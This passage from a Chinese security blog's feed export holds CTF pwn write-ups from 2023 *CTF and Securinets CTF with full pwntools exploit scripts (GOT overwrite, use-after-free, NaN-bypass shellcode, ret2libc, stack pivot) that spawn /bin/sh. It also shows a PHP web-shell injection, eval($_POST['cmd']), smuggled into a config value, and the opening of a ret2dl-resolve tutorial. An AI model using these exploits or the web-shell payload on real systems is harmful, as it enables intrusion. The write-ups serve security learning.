(http://example.com)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Purchase code</span></span><br><span class="line"><span class="variable">$purchase_code</span> = <span class="string">&quot;&#x27;&quot;</span>;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="string">&quot;&#x27;&quot;</span>; <span class="comment">// Your purchase code, don&#x27;t give it to anyone. </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>暗月</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 *CTF</title>
    <url>/2023/08/09/CTF/2023xctf/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h3><p>VmPwn重点在逆向的工作上，搞清楚输入的格式和不同的功能。这里代码还是比较复杂，通过调试理清了程序逻辑。首先是让我们输入命令，每个命令之间以空格作为间隔；接着是输入操作数，每个命令对应两个操作数，每个操作数占4字节，两个操作数占8字节。主要利用的是功能10、功能6和功能7，能够帮助我们任意地址的读写，由于程序没开PIE并且是按照4字节地址进行操作，所以利用泄露的栈地址写返回地址的想法不可行了，最终是做了got表的读写。</p>
<span id="more"></span>

<p>整个堆块的结构如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230802201239762.png" alt="image-20230802201239762"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">case 0: *(ptr + 4 * arg0 + 56) = *(ptr + 4 * arg1 + 56)</span></span><br><span class="line"><span class="string">case 2: *(ptr + 4 * arg0 + 56) += *(ptr + 4 * arg1 + 56)</span></span><br><span class="line"><span class="string">case 3: *(ptr + 4 * arg0 + 56) -= *(ptr + 4 * arg1 + 56)</span></span><br><span class="line"><span class="string">case 6: *(ptr + 0x70) == 0 ? *(ptr + 0x70) = malloc(0x70); *(ptr + 4 * arg0 + 56) = (*(ptr + 0x70))[arg1]</span></span><br><span class="line"><span class="string">case 7: *(ptr + 0x70) == 0 ? *(ptr + 0x70) = malloc(0x70); *(ptr + 0x70)[arg1] = *(ptr + 4 * arg0 + 56)</span></span><br><span class="line"><span class="string">case 10: *(ptr + 4 * arg0 + 56) = arg1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;your vm starts at &#x27;</span>)</span><br><span class="line">leak_stack = <span class="built_in">int</span>(sh.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;leak_stack: &#x27;</span> + <span class="built_in">hex</span>(leak_stack))</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>,</span><br><span class="line">       <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>,</span><br><span class="line">       <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>,</span><br><span class="line">       <span class="number">10</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">16</span>]</span><br><span class="line">cmd = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> cmd])</span><br><span class="line">sh.sendafter(<span class="string">&#x27;your command:&#x27;</span>, cmd)</span><br><span class="line"></span><br><span class="line">cost = [<span class="number">14</span>, <span class="number">0x00000000004040D0</span>,         <span class="comment"># stdin</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x00000000004040D8</span>,                      </span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>, <span class="number">0x00000000004040D8</span>,         <span class="comment"># sh</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x6873</span>,                      </span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>,        </span><br><span class="line">        <span class="number">14</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        <span class="number">0</span>, <span class="number">0x0000000000401270</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>, elf.got[<span class="string">&#x27;setvbuf&#x27;</span>],</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">2</span>, <span class="number">0x30910</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">2</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">233</span>, <span class="number">233</span>,</span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line">cost = <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">int</span>(j)) <span class="keyword">for</span> j <span class="keyword">in</span> cost]) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x000000000040131F&#x27;)</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;your cost:&#x27;</span>, cost)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h3><p>首先是环境问题，<code>libgcc_s.so.1</code>这玩意儿似乎官网的软件包里没有，所以我是直接从Ubuntu20.04上直接拖了一个出来。程序是用rust写的，真正的入口不是main函数，断在write回溯一下就能找到。</p>
<p>首先是Add功能，会先<code>malloc(0x2000)</code>一个堆块，然后向里面写入内容，然后根据输入内容的长度再申请一个堆块，并将内容memcpy到新申请的堆块中，最后释放掉大堆块。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230809175014484.png" alt="image-20230809175014484"></p>
<p>然后是Show功能，没什么好说的正常形态。接着是Edit功能，调用了和Add功能一样的函数。</p>
<p>主要是分析一下Bubble功能，经过我简单的恢复后如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230809175319716.png" alt="image-20230809175319716"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">bubble_method</span><span class="params">(heap_struct *a1, <span class="type">unsigned</span> __int64 count, <span class="type">unsigned</span> __int64 idx_1, <span class="type">unsigned</span> __int64 idx_2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *idx_2_content_ptr; <span class="comment">// rcx</span></span><br><span class="line">  __int64 idx_2_size_1; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rbx</span></span><br><span class="line">  heap_struct *v10; <span class="comment">// r14</span></span><br><span class="line">  __int64 v11; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">void</span> *v12; <span class="comment">// rbx</span></span><br><span class="line">  heap_struct *v13; <span class="comment">// r14</span></span><br><span class="line">  __int64 idx_1_size_0; <span class="comment">// [rsp+8h] [rbp-60h]</span></span><br><span class="line">  <span class="type">void</span> *idx_1_content_ptr; <span class="comment">// [rsp+10h] [rbp-58h]</span></span><br><span class="line">  __int64 idx_1_size_1; <span class="comment">// [rsp+18h] [rbp-50h]</span></span><br><span class="line">  <span class="type">void</span> *src; <span class="comment">// [rsp+20h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( idx_1 == idx_2 )</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  v5 = idx_1;</span><br><span class="line">  idx_1_size_0 = a1[idx_1].size_0;</span><br><span class="line">  idx_1_content_ptr = (<span class="type">void</span> *)a1[idx_1].content_ptr;</span><br><span class="line">  <span class="keyword">if</span> ( idx_2 &gt;= count )</span><br><span class="line">    idx_error(idx_2, count, (__int64)&amp;off_50FD8);</span><br><span class="line">  idx_1_size_1 = a1[idx_1].size_1;</span><br><span class="line"></span><br><span class="line">  v6 = idx_2;</span><br><span class="line">  idx_2_content_ptr = (<span class="type">void</span> *)a1[idx_2].content_ptr;</span><br><span class="line">  v18 = v6 * <span class="number">3</span>;</span><br><span class="line">  idx_2_size_1 = a1[v6].size_1;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( idx_2_size_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    src = idx_2_content_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( idx_2_size_1 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">    v9 = (<span class="type">void</span> *)my_malloc(idx_2_size_1, idx_2_size_1 &gt;= <span class="number">0</span>);</span><br><span class="line">    idx_2_content_ptr = src;</span><br><span class="line">    <span class="keyword">if</span> ( !v9 )</span><br><span class="line">LABEL_14:</span><br><span class="line">      sub_86E0(idx_2_size_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = &amp;dword_0 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(v9, idx_2_content_ptr, idx_2_size_1);</span><br><span class="line">  <span class="keyword">if</span> ( idx_1 &gt;= count )</span><br><span class="line">    idx_error(idx_1, count, (__int64)&amp;off_50FF0);</span><br><span class="line">  v10 = &amp;a1[v5];</span><br><span class="line">  v11 = idx_1_size_0;</span><br><span class="line">  <span class="keyword">if</span> ( idx_1_size_0 )</span><br><span class="line">    j_free(idx_1_content_ptr);</span><br><span class="line">  v10-&gt;size_0 = idx_2_size_1;</span><br><span class="line">  v10-&gt;content_ptr = (__int64)v9;</span><br><span class="line">  v10-&gt;size_1 = idx_2_size_1;</span><br><span class="line">  idx_2_size_1 = idx_1_size_1;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( idx_1_size_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( idx_1_size_1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      idx_2_size_1 = idx_1_size_1;</span><br><span class="line">      v12 = (<span class="type">void</span> *)my_malloc(idx_1_size_1, idx_1_size_1 &gt;= <span class="number">0</span>);</span><br><span class="line">      v11 = idx_1_size_0;</span><br><span class="line">      <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_23:</span><br><span class="line">    sub_3B170();</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = &amp;dword_0 + <span class="number">1</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">  v13 = (heap_struct *)((<span class="type">char</span> *)a1 + <span class="number">8</span> * v18);</span><br><span class="line">  <span class="built_in">memcpy</span>(v12, idx_1_content_ptr, idx_2_size_1);</span><br><span class="line">  <span class="keyword">if</span> ( v13-&gt;size_0 )</span><br><span class="line">    j_free((<span class="type">void</span> *)v13-&gt;content_ptr);</span><br><span class="line">  v13-&gt;size_0 = idx_2_size_1;</span><br><span class="line">  v13-&gt;content_ptr = (__int64)v12;</span><br><span class="line">  v13-&gt;size_1 = idx_2_size_1;</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    j_free(idx_1_content_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以清晰地看到，该功能对堆块进行了重新排序，也就是令一个堆块置顶或者是置底，同时也会对操作的堆块进行释放，存在UAF漏洞。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./drop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./drop&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;content of the new item: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;new content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bubble</span>(<span class="params">choice, idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;West/East? (0 is West and 1 is East)&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line">    sla(<span class="string">&#x27;Launching index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x300</span>)       <span class="comment"># 0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x500</span>)       <span class="comment"># 1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x300</span>)       <span class="comment"># 2</span></span><br><span class="line">bubble(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x1ecbe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span>)       <span class="comment"># 3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span>)       <span class="comment"># 4</span></span><br><span class="line">bubble(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>, flat(libc_base + <span class="number">0x1eee48</span> - <span class="number">8</span>))</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span>)       <span class="comment"># 5</span></span><br><span class="line">add(flat(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>, libc_base + <span class="number">0x20c2f0</span>).ljust(<span class="number">0x400</span>, <span class="string">b&#x27;\x00&#x27;</span>))       <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h3><p>一道浮点数绕过的题目，栈可执行，复现的过程中遇到了两个问题。</p>
<p>问题一：程序逻辑和栈帧的理解，忽略了alloc函数一直没看懂栈的结构，alloc函数的作用是在栈上开辟一段空间出来，但是很有可能会造成溢出，目前是已经被弃用了。在这道题中，变量buf所指向的栈空间位于变量s所指向的栈空间高0x40字节的地方。</p>
<p>问题二：是对于浮点数的理解，通过调试发现需要写一个跳转指令跳到shellcode上，但是该跳转指令需要绕过浮点数的检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v13 != <span class="number">0.0</span> &amp;&amp; (v13 &lt; <span class="number">1.0</span> || v13 &gt; <span class="number">100.0</span>) )</span><br></pre></td></tr></table></figure>

<blockquote>
<p>先复习一下浮点数：<a href="https://blog.csdn.net/weixin_45863060/article/details/125054244">浮点数详解</a></p>
</blockquote>
<p>IEEE754浮点数的结构：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230805164146997.png" alt="image-20230805164146997"></p>
<p>利用特性：阶码（exp）全为0时，当尾数（frac）全为0时，根据数符（s），表示无穷大或者是无穷小；当尾数（frac）不全为0时，该浮点数表示非数值（NaN），而NaN具有以下的特点：</p>
<table>
<thead>
<tr>
<th>Comparison</th>
<th>NaN ≥ <em>x</em></th>
<th>NaN ≤ <em>x</em></th>
<th>NaN &gt; <em>x</em></th>
<th>NaN &lt; <em>x</em></th>
<th>NaN &#x3D; <em>x</em></th>
<th>NaN ≠ <em>x</em></th>
</tr>
</thead>
<tbody><tr>
<td>Result</td>
<td>False</td>
<td>False</td>
<td>False</td>
<td>False</td>
<td>False</td>
<td>True</td>
</tr>
</tbody></table>
<p>所以只要保证我们跳转指令的高位为<code>0x7ff</code>或<code>0xfff</code>即可绕过检查。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp 0xffffffffffffffb0;		# \xeb\xae</span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./fcalc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;1 2 3 00&#x27;</span></span><br><span class="line">pld += asm(shellcraft.sh())</span><br><span class="line">pld = pld.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pld += <span class="string">b&#x27;\xeb\xae\x00\x00\x00\x00\xff\xff&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x000000000000187A)&#x27;)</span></span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>













]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>*CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 Securinets CTF</title>
    <url>/2023/08/08/CTF/2023Securinetsctf/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>一道x86的栈溢出，不过在return的地方做了手脚，不能直接溢出到返回地址。<strong>注意gets函数会将接收的换行符变为\x00</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process([<span class="string">&#x27;./ld-linux.so.2&#x27;</span>, <span class="string">&#x27;./main&#x27;</span>], env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span> : <span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_ebx_r = <span class="number">0x0804901e</span></span><br><span class="line">ret = <span class="number">0x08049224</span></span><br><span class="line"></span><br><span class="line">pld = flat(elf.plt[<span class="string">&#x27;puts&#x27;</span>], p_ebx_r, elf.got[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x080491D3</span>)</span><br><span class="line">pld = ((<span class="number">0x50</span> - <span class="built_in">len</span>(pld)) // <span class="number">4</span>) * flat(ret) + pld</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Is this solveable?\n&#x27;</span>, pld)</span><br><span class="line">libc_base = u32(sh.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x08049213&#x27;)</span></span><br><span class="line">pld = flat(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], ret, libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__())</span><br><span class="line">pld = ((<span class="number">0x50</span> - <span class="built_in">len</span>(pld)) // <span class="number">4</span>) * flat(ret) + pld</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Is this solveable?\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="One-is-enough"><a href="#One-is-enough" class="headerlink" title="One is enough"></a>One is enough</h3><p>看题名就知道是溢出一个字节，这里可以覆盖rbp的低位一个字节，再利用readDescription函数和main函数的两次leave实现栈迁移，需要爆破一下。该程序为静态链接，利用syscall就能getshell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read = <span class="number">0x0000000000431BC0</span></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000401f3d</span></span><br><span class="line">p_rdx_rbx_r = <span class="number">0x0000000000463367</span></span><br><span class="line">p_rsi_r = <span class="number">0x000000000040ab23</span></span><br><span class="line">p_rax_r = <span class="number">0x0000000000431c77</span></span><br><span class="line">syscall = <span class="number">0x00000000004011a2</span></span><br><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;3. Quit\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	pld = flat(</span><br><span class="line">		ret, ret,</span><br><span class="line">		p_rdi_r, <span class="number">0</span>,</span><br><span class="line">		p_rsi_r, elf.bss() + <span class="number">0x200</span>,</span><br><span class="line">		p_rdx_rbx_r, <span class="number">0x100</span>, <span class="number">0</span>,</span><br><span class="line">		read,</span><br><span class="line">		p_rdi_r, elf.bss() + <span class="number">0x200</span>,</span><br><span class="line">		p_rsi_r, <span class="number">0</span>,</span><br><span class="line">		p_rdx_rbx_r, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">		syscall,</span><br><span class="line">	)</span><br><span class="line">	sh.sendafter(<span class="string">&#x27;Your description:\n&#x27;</span>, pld + <span class="string">b&#x27;\x18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	sh.sendlineafter(<span class="string">&#x27;3. Quit\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sh.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">59</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		sh = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">		pwn()</span><br><span class="line">		</span><br><span class="line">		sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">		sh.interactive()</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		sh.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">		</span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">		sh.close()</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Securinets CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Ret2dl-Resolve</title>
    <url>/2023/07/28/Pwn/Ret2dlresolve/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>首先了解几个重要的section：</p>
<ol>
<li><p><code>.dynamic</code>：ld.so使用的动态链接信息。<strong>主要关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</strong>。在IDA里面如下所示：</p>
<p><img src="https://s1.ax1x.com/2022/10/17/xDBpuj.png" alt=".dynamic"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<ol start="2">
<li><p><code>.dynstr</code>：一个字符串表，保存了动态链接所需的字符串，index[0]的地方值始终为零，在后续我们需要用这些字符串的时候，<strong>取的都是这些字符串相对于节表头的偏移</strong>，在IDA里面如下图所示：</p>
<p><img src="https://s1.ax1x.com/2022/10/17/xD0zvQ.png" alt=".dynstr"></p>
</li>
